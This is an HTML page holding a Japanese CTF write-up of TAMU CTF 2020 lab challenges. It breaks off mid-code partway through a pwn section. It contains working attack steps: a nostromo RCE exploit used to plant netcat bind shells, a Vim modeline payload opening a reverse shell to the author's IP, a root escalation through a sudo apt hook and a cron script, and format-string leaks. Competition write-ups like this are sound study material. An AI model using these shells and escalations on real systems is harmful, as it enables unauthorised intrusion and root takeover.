@@ -1,0 +1,1139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>TAMU CTF 2020 Writeup | フラxxグゲット - CTF フラxxグゲット</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="URL: https://tamuctf.com/challenges Network Pentestのチャレンジがあったり、とても面白かったです！！ ちょうど2月末くらいからHack The BoxでMachineを攻略し始めてい" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+
+
+
+<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
+
+
+<meta name="generator" content="Hugo 0.59.1 with theme even" />
+
+
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/tamuctf_2020/" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
+<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
+<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="https://captureamerica.github.io/writeups/dist/even.c2a46f00.min.css" rel="stylesheet">
+
+
+
+<meta property="og:title" content="TAMU CTF 2020 Writeup | フラxxグゲット" />
+<meta property="og:description" content="URL: https://tamuctf.com/challenges Network Pentestのチャレンジがあったり、とても面白かったです！！ ちょうど2月末くらいからHack The BoxでMachineを攻略し始めてい" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/tamuctf_2020/" />
+<meta property="article:published_time" content="2020-03-30T15:30:00+09:00" />
+<meta property="article:modified_time" content="2020-03-30T15:30:00+09:00" />
+<meta itemprop="name" content="TAMU CTF 2020 Writeup | フラxxグゲット">
+<meta itemprop="description" content="URL: https://tamuctf.com/challenges Network Pentestのチャレンジがあったり、とても面白かったです！！ ちょうど2月末くらいからHack The BoxでMachineを攻略し始めてい">
+
+
+<meta itemprop="datePublished" content="2020-03-30T15:30:00&#43;09:00" />
+<meta itemprop="dateModified" content="2020-03-30T15:30:00&#43;09:00" />
+<meta itemprop="wordCount" content="3398">
+
+
+
+<meta itemprop="keywords" content="CTF," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="TAMU CTF 2020 Writeup | フラxxグゲット"/>
+<meta name="twitter:description" content="URL: https://tamuctf.com/challenges Network Pentestのチャレンジがあったり、とても面白かったです！！ ちょうど2月末くらいからHack The BoxでMachineを攻略し始めてい"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="https://captureamerica.github.io/writeups/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="https://captureamerica.github.io/writeups/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="https://captureamerica.github.io/writeups/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="https://captureamerica.github.io/writeups/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="https://captureamerica.github.io/writeups/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">TAMU CTF 2020 Writeup | フラxxグゲット</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2020-03-30 </span>
+        <div class="post-category">
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#network-pentest-my-first-blog">[Network Pentest]: MY_FIRST_BLOG</a>
+<ul>
+<li><a href="#challenge">Challenge</a></li>
+<li><a href="#solution">Solution</a></li>
+</ul></li>
+<li><a href="#network-pentest-obituary-1-obituary-2">[Network Pentest]: OBITUARY_1 &amp; OBITUARY_2</a>
+<ul>
+<li><a href="#challenge-1">Challenge</a></li>
+<li><a href="#solution-1">Solution</a></li>
+</ul></li>
+<li><a href="#pwn-echo-as-a-service">[Pwn]: ECHO_AS_A_SERVICE</a>
+<ul>
+<li><a href="#challenge-2">Challenge</a></li>
+<li><a href="#solution-2">Solution</a></li>
+</ul></li>
+<li><a href="#pwn-troll">[Pwn]: TROLL</a>
+<ul>
+<li><a href="#challenge-3">Challenge</a></li>
+<li><a href="#solution-3">Solution</a></li>
+</ul></li>
+<li><a href="#misc-corrupted-disk">[Misc]: CORRUPTED_DISK</a>
+<ul>
+<li><a href="#challenge-4">Challenge</a></li>
+<li><a href="#solution-4">Solution</a></li>
+</ul></li>
+<li><a href="#misc-zippity-doo-dah">[Misc]: ZIPPITY_DOO_DAH</a>
+<ul>
+<li><a href="#challenge-5">Challenge</a></li>
+<li><a href="#solution-5">Solution</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<p>URL: <a href="https://tamuctf.com/challenges" target="_blank">https://tamuctf.com/challenges</a>
+<br /><br />
+Network Pentestのチャレンジがあったり、とても面白かったです！！</p>
+
+<p>ちょうど2月末くらいからHack The BoxでMachineを攻略し始めていて、それがとても役に立ちました。</p>
+
+<p>サーバもとても安定していて、よかったですね。</p>
+
+<p><br>
+以下がスコアです。</p>
+
+<p><img src="https://captureamerica.github.io/writeups/img/tamuctf_2020_Score1.png" alt="tamuctf_2020_Score1.png"></p>
+
+<p><img src="https://captureamerica.github.io/writeups/img/tamuctf_2020_Score2.png" alt="tamuctf_2020_Score2.png"></p>
+
+<p><br /><br /></p>
+
+<h2 id="network-pentest-my-first-blog">[Network Pentest]: MY_FIRST_BLOG</h2>
+
+<hr />
+
+<h3 id="challenge">Challenge</h3>
+
+<blockquote>
+<p>Here is a link to my new blog! I read about a bunch of exploits in common server side blog tools so I just decided to make my website static. Hopefully that should keep it secure.
+<br /><br />
+Root owns the flag.
+<br /><br />
+<a href="http://172.30.0.2/" target="_blank">http://172.30.0.2/</a></p>
+</blockquote>
+
+<p>Attachment:</p>
+
+<ul>
+<li>my-first-blog.ovpn</li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="solution">Solution</h3>
+
+<p>まず、nmapです。とりあえずサクっと Version Scan だけしてみました。</p>
+
+<pre>
+captureamerica@kali:~/Downloads$ nmap -sV 172.30.0.2 -p 80
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-20 08:42 +08
+Nmap scan report for 172.30.0.2
+Host is up (0.23s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nostromo 1.9.6
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.74 seconds
+</pre>
+
+<p><br>
+ウェブサーバがnostromoというので動いているようです。searchsploitでexploitを探します。</p>
+
+<pre>
+captureamerica@kali:~/Downloads$ searchsploit nostromo
+----------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                           |  Path
+                                                                                         | (/usr/share/exploitdb/)
+----------------------------------------------------------------------------------------- ----------------------------------------
+Nostromo - Directory Traversal Remote Command Execution (Metasploit)                     | exploits/multiple/remote/47573.rb
+nostromo 1.9.6 - Remote Code Execution                                                   | exploits/multiple/remote/47837.py
+nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                     | exploits/linux/remote/35466.sh
+----------------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+</pre>
+
+<p><br>
+2番目の47837.pyがよさそうです。バージョン1.9.6も同じだし、RCEだし。</p>
+
+<p>ダウンロードして、いちおう文字コードも直しておきます。</p>
+
+<pre>
+captureamerica@kali:~/Downloads$ searchsploit -m exploits/multiple/remote/47837.py
+  Exploit: nostromo 1.9.6 - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/47837
+     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+
+Copied to: /home/captureamerica/Downloads/47837.py
+
+
+captureamerica@kali:~/Downloads$ nkf -w -Lu --overwrite 47837.py 
+</pre>
+
+<p><br>
+あ、あと、47837.py のアタマの方にコメント等が入っているので、消しておかないとエラーになります。</p>
+
+<p>ちなみに、CVE-2019-16278のようです。</p>
+
+<p>引数で任意のコマンドが指定できるようです。バックドアをしかけます。</p>
+
+<pre>
+captureamerica@kali:~/Downloads$ ./47837.py 172.30.0.2 80 "nc -l -p 3333 -e /bin/bash"
+
+
+                                        _____-2019-16278
+        _____  _______    ______   _____\    \   
+   _____\    \_\      |  |      | /    / |    |  
+  /     /|     ||     /  /     /|/    /  /___/|  
+ /     / /____/||\    \  \    |/|    |__ |___|/  
+|     | |____|/ \ \    \ |    | |       \        
+|     |  _____   \|     \|    | |     __/ __     
+|\     \|\    \   |\         /| |\    \  /  \    
+| \_____\|    |   | \_______/ | | \____\/    |   
+| |     /____/|    \ |     | /  | |    |____/|   
+ \|_____|    ||     \|_____|/    \|____|   | |   
+        |____|/                        |___|/    
+
+
+</pre>
+
+<p><br>
+これで、別のターミナルからncで繋ぐことができます。</p>
+
+<pre>
+captureamerica@kali:~/Downloads$ nc 172.30.0.2 3333
+id
+uid=1000(webserver) gid=1000(webserver) groups=1000(webserver)
+
+</pre>
+
+<p><br>
+いろいろ探した結果、crontabの中で以下が見つかりました。/usr/bin/healthcheck がroot権限で動いているようです。</p>
+
+<pre>
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root /usr/bin/healthcheck
+</pre>
+
+<p><br>
+しかも、パーミッションが777です。
+<pre>
+ls -l /usr/bin/ | grep healthcheck
+-rwxrwxrwx 1 root root         98 Mar 19 18:41 healthcheck
+</pre></p>
+
+<p><br>
+ここでうっかりファイルの中身を消してしまい、DiscordでAdminの人にゴメンナサイしたところ、サーバはチーム毎にあるから好きにしていいよ、とのことでした。</p>
+
+<p>ということで、</p>
+
+<pre>
+cd /usr/bin/
+echo "nc -l -p 4444 -e /bin/bash" > healthcheck
+</pre>
+
+<p><br>
+ただし、これはなぜか動かなかったので、違うポート番号（123）で試したらいけました。</p>
+
+<pre>
+echo "nc -l -p 123 -e /bin/bash" > healthcheck
+</pre>
+
+<p><br>
+<pre>
+captureamerica@kali:~/Downloads$ nc 172.30.0.2 123
+id
+uid=0(root) gid=0(root) groups=0(root)
+ls -l /root
+total 4
+-rw-rw-r-- 1 root root 29 Mar 19 18:41 flag.txt
+cat flag.txt
+gigem{l1m17_y0ur_p3rm15510n5}
+</pre></p>
+
+<p><br>
+Flag: <code>gigem{l1m17_y0ur_p3rm15510n5}</code></p>
+
+<p><br /><br />
+<br /><br /></p>
+
+<h2 id="network-pentest-obituary-1-obituary-2">[Network Pentest]: OBITUARY_1 &amp; OBITUARY_2</h2>
+
+<hr />
+
+<h3 id="challenge-1">Challenge</h3>
+
+<blockquote>
+<p>Hey, shoot me over your latest version of the code. I have a simple nc session up, just pass it over when you're ready.
+<br /><br />
+You're using vim, right? You should use it; it'll change your life. I basically depend on it for everything these days!
+<br /><br />
+NOTE: This challenge is two parts. Flag one belongs to mwazoski. Flag two belongs to root.</p>
+</blockquote>
+
+<p>Attachment:</p>
+
+<ul>
+<li>obituary.ovpn</li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="solution-1">Solution</h3>
+
+<p>まず、nmapします。</p>
+
+<pre>
+captureamerica@kali:~/Downloads$ sudo nmap -sV -sC -oA nmap 172.30.0.2
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-20 11:20 +08
+Nmap scan report for 172.30.0.2
+Host is up (0.22s latency).
+Not shown: 999 closed ports
+PORT     STATE SERVICE VERSION
+4321/tcp open  rwhois?
+MAC Address: 02:42:EE:81:CE:1E (Unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 193.42 seconds
+</pre>
+
+<p><br>
+変なポート (4321) が一個開いているだけでした。</p>
+
+<p><br>
+Vimがなんじゃらって言っているので、Vimに関する脆弱性を探して、以下が見つかりました。</p>
+
+<p><a href="https://medium.com/@magrabursofily/exploit-poc-linux-command-execution-on-vim-neovim-vulnerability-cve-2019-12735-4c770d5573cf" target="_blank">https://medium.com/@magrabursofily/exploit-poc-linux-command-execution-on-vim-neovim-vulnerability-cve-2019-12735-4c770d5573cf</a></p>
+
+<p><br>
+正直、意味がわからないですが、コピペ＆編集して以下のようなテキストファイルを作ります。ファイル名は、vim_cmd.txtにしました。(172.30.0.14は自分のIPです。)</p>
+
+<pre>
+:!nc -nv 172.30.0.14 4444 -e /bin/sh ||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
+</pre>
+
+<p><br>
+チャレンジ文より、&quot;shoot me over your latest version of the code&quot; とのことなので、こいつを投げてみます。</p>
+
+<p>別ターミナルで <code>nc -l -p 4444</code> で待受けをしておいて、以下のコマンドで投げます。</p>
+
+<pre>
+nc 172.30.0.2 4321 < vim_cmd.txt
+</pre>
+
+<p><br>
+繋がりました。</p>
+
+<pre>
+captureamerica@kali:~/CTF/TAMUctf_2020/Obituary$ nc -l -p 4444
+id
+uid=1000(mwazowski) gid=1000(mwazowski) groups=1000(mwazowski)
+</pre>
+
+<p><br>
+このユーザ（mwazowski）が所有するファイルをみてみます。
+<pre>
+find / -user mwazowski
+:
+(略)
+:
+/proc/772/patch_state
+/run/screen/S-mwazowski
+/run/screen/S-mwazowski/756.Jw7hxfsUAP
+/tmp/.tmp.Jw7hxfsUAP.swp
+/home/mwazowski
+/home/mwazowski/.profile
+/home/mwazowski/.bashrc
+/home/mwazowski/.bash_logout
+/home/mwazowski/.viminfo
+/dev/pts/0
+:
+:
+</pre></p>
+
+<p><br>
+どうやら、screenを使っているようです。</p>
+
+<pre>
+screen -ls
+There is a screen on:
+    756.Jw7hxfsUAP  (03/20/20 03:33:45) (Detached)
+1 Socket in /run/screen/S-mwazowski.
+screen -r 756
+Must be connected to a terminal.
+pwd
+/tmp
+python -c 'import pty; pty.spawn("/bin/bash");'
+screen -r 756
+Must be connected to a terminal.
+</pre>
+
+<p><br>
+このterminalなんじゃらのエラー(&quot;Must be connected to a terminal&quot;)は、ちょっとググったところ <code>script /dev/null</code> で直るとのこと。</p>
+
+<pre>
+script /dev/null
+Script started, file is /dev/null
+mwazowski@97c3648d9667:/tmp$ cd /home
+cd /home
+lmwazowski@97c3648d9667:/home$ls -la
+ls -la
+total 16
+drwxr-xr-x 1 root      root      4096 Mar 19 02:06 .
+drwxr-xr-x 1 root      root      4096 Mar 20 03:19 ..
+drwxr-xr-x 1 mwazowski mwazowski 4096 Mar 20 03:31 mwazowski
+mwazowski@97c3648d9667:/home$ cd mwazowski
+cd mwazowski
+mwazowski@97c3648d9667:~$ ls -la
+ls -la
+total 48
+drwxr-xr-x 1 mwazowski mwazowski  4096 Mar 20 03:31 .
+drwxr-xr-x 1 root      root       4096 Mar 19 02:06 ..
+-rw-r--r-- 1 mwazowski mwazowski   220 Apr 18  2019 .bash_logout
+-rw-r--r-- 1 mwazowski mwazowski  3526 Apr 18  2019 .bashrc
+-rw-r--r-- 1 mwazowski mwazowski   807 Apr 18  2019 .profile
+-rw------- 1 mwazowski mwazowski 10201 Mar 20 03:31 .viminfo
+-rw-rw-r-- 1 root      root         28 Mar 19 00:40 flag.txt
+-rw-r--r-- 1 root      root         96 Mar 19 02:06 manually_installed_packages.txt
+-rw-rw-r-- 1 root      root        342 Mar 19 00:40 note_to_self.txt
+mwazowski@97c3648d9667:~$ cat flag.txt
+cat flag.txt
+gigem{ca7_1s7_t0_mak3_suRe}
+</pre>
+
+<p><br>
+ユーザフラグ、ゲットです。</p>
+
+<p>Flag: <code>gigem{ca7_1s7_t0_mak3_suRe}</code></p>
+
+<p><br /><br />
+<br /><br />
+次はrootのフラグです。</p>
+
+<pre>
+mwazowski@97c3648d9667:~$ sudo -l
+sudo -l
+Matching Defaults entries for mwazowski on 97c3648d9667:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User mwazowski may run the following commands on 97c3648d9667:
+    (root) NOPASSWD: /usr/bin/apt
+</pre>
+
+<p><br>
+aptが実行できるみたいです。</p>
+
+<p>ここで、aptを使った権限昇格をググって調べました。以下がやり方です。</p>
+
+<pre>
+mwazowski@97c3648d9667:~$ sudo apt update -o APT::Update::Pre-Invoke::="/bin/bash -i"
+
+root@97c3648d9667:/tmp# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@97c3648d9667:/tmp# cd /root
+cd /root
+root@97c3648d9667:~# ls  
+ls 
+flag.txt
+root@97c3648d9667:~# cat flag.txt
+cat flag.txt
+gigem{y0u_w0u1d_7h1nk_p3opl3_W0u1d_Kn0W_b3773r}
+</pre>
+
+<p><br>
+rootのフラグ、ゲットです。</p>
+
+<p>Flag: <code>gigem{y0u_w0u1d_7h1nk_p3opl3_W0u1d_Kn0W_b3773r}</code></p>
+
+<p><br /><br />
+<br /><br /></p>
+
+<h2 id="pwn-echo-as-a-service">[Pwn]: ECHO_AS_A_SERVICE</h2>
+
+<hr />
+
+<h3 id="challenge-2">Challenge</h3>
+
+<blockquote>
+<p>Echo as a service (EaaS) is going to be the newest hot startup! We've tapped a big market: Developers who really like SaaS.
+<br /><br />
+nc challenges.tamuctf.com 4251</p>
+</blockquote>
+
+<p>Attachment:</p>
+
+<ul>
+<li>echoasaservice (ELF 64bit)</li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="solution-2">Solution</h3>
+
+<p>まずはサーバに繋いでみて、動きを確認します。</p>
+
+<pre>
+captureamerica@kali:~/CTF/TAMUctf_2020$ nc challenges.tamuctf.com 4251
+Echo as a service (EaaS)
+hello
+hello
+Echo as a service (EaaS)
+test
+test
+Echo as a service (EaaS)
+flag
+flag
+Echo as a service (EaaS)
+bye
+bye
+Echo as a service (EaaS)
+^C
+</pre>
+
+<p><br>
+入力した文字列がそのままEcho backされてくるだけです。</p>
+
+<p><br>
+Ghidraでソースを調べます。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="n">FILE</span> <span class="o">*</span><span class="n">__stream</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">local_48</span> <span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="n">local_28</span> <span class="p">[</span><span class="mi">24</span><span class="p">];</span>
+  <span class="n">undefined8</span> <span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">__stream</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">__stream</span> <span class="o">!=</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">local_48</span><span class="p">,</span><span class="mh">0x19</span><span class="p">,</span><span class="n">__stream</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">do</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Echo as a service (EaaS)&#34;</span><span class="p">);</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">local_28</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="n">local_28</span><span class="p">);</span>
+    <span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>FSB (Format String Bug) がありますね。（printf(local_28);の箇所）</p>
+
+<p><br>
+テキトーに %1$s から順番に見ていけばそのうちフラグが出るだろうと思ってやってみたんですが、全然出てこない。。。</p>
+
+<p><br>
+ローカルでちょこちょこテストしていたところ、<code>%8$p</code> <code>%9$p</code> 辺りで文字列になりそうな数字が出ているのに気づきました。</p>
+
+<p>しかも、順番がreverseになってます。</p>
+
+<pre>
+0x6c667b6d65676967
+lf{megig
+
+0x7d757365645f6761
+}used_ga
+</pre>
+
+<p><br></p>
+
+<p>ということで、CTFサーバ側にも同様なことをやってみます。
+<pre>
+captureamerica@kali:~/CTF/TAMUctf_2020$ nc challenges.tamuctf.com 4251
+Echo as a service (EaaS)
+%8$p
+0x61337b6d65676967
+Echo as a service (EaaS)
+%9$p
+0x616d7230665f7973
+Echo as a service (EaaS)
+%10$p
+0x7d316e6c75765f74
+Echo as a service (EaaS)
+%11$p
+(nil)
+Echo as a service (EaaS)
+</pre></p>
+
+<p><br>
+以下のように文字列に変換しました。</p>
+
+<pre>
+captureamerica@kali:~/CTF/TAMUctf_2020$ unhex 7d316e6c75765f74616d7230665f797361337b6d65676967 | rev ; echo
+gigem{3asy_f0rmat_vuln1}
+</pre>
+
+<p>Flag: <code>gigem{3asy_f0rmat_vuln1}</code></p>
+
+<p><br /><br />
+<br /><br /></p>
+
+<h2 id="pwn-troll">[Pwn]: TROLL</h2>
+
+<hr />
+
+<h3 id="challenge-3">Challenge</h3>
+
+<blockquote>
+<p>There's a troll who thinks his challenge won't be solved until the heat death of the universe.
+<br /><br />
+nc challenges.tamuctf.com 4765</p>
+</blockquote>
+
+<p>Attachment:</p>
+
+<ul>
+<li>troll (ELF 64bit)</li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="solution-3">Solution</h3>
+
+<p>Ghidraでソースを調べます。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">local_98</span> <span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="n">local_58</span> <span class="p">[</span><span class="mi">44</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">local_2c</span><span class="p">;</span>
+  <span class="n">FILE</span> <span class="o">*</span><span class="n">local_28</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_1c</span><span class="p">;</span>
+  <span class="n">time_t</span> <span class="n">local_18</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_c</span><span class="p">;</span>
+  
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">local_18</span> <span class="o">=</span> <span class="n">time</span><span class="p">((</span><span class="n">time_t</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Who goes there?&#34;</span><span class="p">);</span>
+  <span class="n">gets</span><span class="p">(</span><span class="n">local_58</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Welcome to my challenge, %s. No one has ever succeeded before. Will you be the first?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
+         <span class="n">local_58</span><span class="p">);</span>
+  <span class="n">srand</span><span class="p">((</span><span class="n">uint</span><span class="p">)</span><span class="n">local_18</span><span class="p">);</span>
+  <span class="n">local_c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="mi">99</span> <span class="o">&lt;</span> <span class="n">local_c</span><span class="p">)</span> <span class="p">{</span>
